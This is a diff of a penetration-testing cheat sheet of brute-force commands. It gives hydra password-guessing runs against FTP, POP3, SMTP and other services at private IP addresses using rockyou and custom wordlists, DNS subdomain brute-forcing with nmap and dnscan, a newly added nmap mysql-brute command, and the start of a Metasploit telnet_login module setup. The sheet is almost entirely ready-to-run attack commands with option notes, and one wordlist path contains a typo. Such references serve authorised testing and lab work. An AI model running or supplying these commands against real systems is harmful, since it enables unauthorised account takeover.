@@ -19,14 +19,18 @@ hydra -t 4 -l root -P /usr/share/wordlists/cristi-passwords.txt 127.0.0.1 -s 500
   ## Bruteforce FTP
 hydra -t 4 -L /usr/share/wordlists/cristi.txt -P /usr/share/wordlists/cristi-passwords.txt 192.168.13.236 ftp
 
-#Bruteforce POP3
+  ##Bruteforce POP3
 hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.158 pop3
 
   ## DNS bruteforce
 nmap -p 80 --script dns-brute.nse domain.com 
 python dnscan.py -d domain.com -w ./subdomains-10000.txt
 
-  ## SMTP brute force
+  ## MySQL bruteforce
+nmap -p 3306 --script mysql-brute --script-args userdb=/usr/share/wordlists/mysql_users.txt,passdb=/usr/share/wordists/rockyou.txt -vv 192.168.31.139
+   OR with hexorbase
+
+ ## SMTP brute force
 hydra -s 25 -v -V -l root@ucal.local -P /usr/share/wordlists/rockyou.txt -t 1 -w 20 -f 192.168.29.55 smtp
 
 -l LOGIN name
@@ -38,7 +42,7 @@ hydra -s 25 -v -V -l root@ucal.local -P /usr/share/wordlists/rockyou.txt -t 1 -w
 -w waittime for responses (32s) / between connects per thread
 -f exit after the first found login/password pair
 
-    ## Telnet bruteforce
+  ## Telnet bruteforce
 
 use auxiliary/scanner/telnet/telnet_login
 msf auxiliary(telnet_login) > set BLANK_PASSWORDS false
